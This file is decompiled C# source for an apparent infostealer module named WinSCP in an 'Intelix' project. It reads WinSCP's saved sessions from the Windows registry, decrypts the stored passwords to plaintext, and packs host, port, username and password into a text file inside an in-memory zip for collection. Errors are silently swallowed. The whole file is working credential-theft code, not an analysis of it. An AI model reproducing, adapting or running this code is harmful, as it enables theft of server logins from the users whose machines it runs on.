using System;
using System.Collections.Generic;
using System.Linq;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000055 RID: 85
	public class WinSCP : ITarget
	{
		// Token: 0x0600010F RID: 271 RVA: 0x0000FCC8 File Offset: 0x0000DEC8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
				{
					bool flag = registryKey == null;
					if (flag)
					{
						return;
					}
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string text in subKeyNames)
					{
						string text2 = "Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + text;
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text2))
						{
							bool flag2 = registryKey2 != null;
							if (flag2)
							{
								object value = registryKey2.GetValue("HostName");
								string text3 = (value != null) ? value.ToString() : null;
								bool flag3 = !string.IsNullOrWhiteSpace(text3);
								if (flag3)
								{
									object value2 = registryKey2.GetValue("UserName");
									string text4 = (value2 != null) ? value2.ToString() : null;
									object value3 = registryKey2.GetValue("Password");
									string pass = (value3 != null) ? value3.ToString() : null;
									string text5 = WinSCP.DecryptPassword(text4, pass, text3);
									object value4 = registryKey2.GetValue("PortNumber");
									string text6 = (value4 != null) ? value4.ToString() : null;
									list.Add(string.Concat(new string[]
									{
										"Session: ",
										text,
										"\nUrl: ",
										text3,
										":",
										text6,
										"\nUsername: ",
										text4,
										"\nPassword: ",
										text5
									}));
									list2.Add("HKEY_CURRENT_USER\\" + text2);
								}
							}
						}
					}
				}
			}
			catch
			{
			}
			bool flag4 = list.Count <= 0;
			if (!flag4)
			{
				string text7 = "WinScp\\Sessions.txt";
				zip.AddTextFile(text7, string.Join("\n\n", list));
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "WinSCP";
				foreach (string str in list2)
				{
					counterApplications.Files.Add(str + " => " + text7);
				}
				counterApplications.Files.Add(text7);
				counter.Applications.Add(counterApplications);
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000FF84 File Offset: 0x0000E184
		private static int DecryptNextChar(List<string> charList)
		{
			return 255 ^ (((int.Parse(charList[0]) << 4) + int.Parse(charList[1]) ^ 163) & 255);
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000FFC4 File Offset: 0x0000E1C4
		private static string DecryptPassword(string user, string pass, string host)
		{
			bool flag = string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass) || string.IsNullOrEmpty(host);
			string result;
			if (flag)
			{
				result = "";
			}
			else
			{
				try
				{
					List<string> list = (from c in pass
					select c.ToString()).ToList<string>();
					List<string> list2 = new List<string>();
					foreach (string text in list)
					{
						string text2 = text;
						string a = text2;
						if (!(a == "A"))
						{
							if (!(a == "B"))
							{
								if (!(a == "C"))
								{
									if (!(a == "D"))
									{
										if (!(a == "E"))
										{
											if (!(a == "F"))
											{
												list2.Add(text);
											}
											else
											{
												list2.Add("15");
											}
										}
										else
										{
											list2.Add("14");
										}
									}
									else
									{
										list2.Add("13");
									}
								}
								else
								{
									list2.Add("12");
								}
							}
							else
							{
								list2.Add("11");
							}
						}
						else
						{
							list2.Add("10");
						}
					}
					bool flag2 = WinSCP.DecryptNextChar(list2) == 255;
					if (flag2)
					{
						WinSCP.DecryptNextChar(list2);
					}
					list2.RemoveRange(0, 4);
					int num = WinSCP.DecryptNextChar(list2);
					list2.RemoveRange(0, 2);
					int count = WinSCP.DecryptNextChar(list2) * 2;
					list2.RemoveRange(0, count);
					string text3 = "";
					for (int i = 0; i < num; i++)
					{
						text3 += ((char)WinSCP.DecryptNextChar(list2)).ToString();
						list2.RemoveRange(0, 2);
					}
					string oldValue = user + host;
					result = text3.Replace(oldValue, "");
				}
				catch
				{
					result = "";
				}
			}
			return result;
		}
	}
}
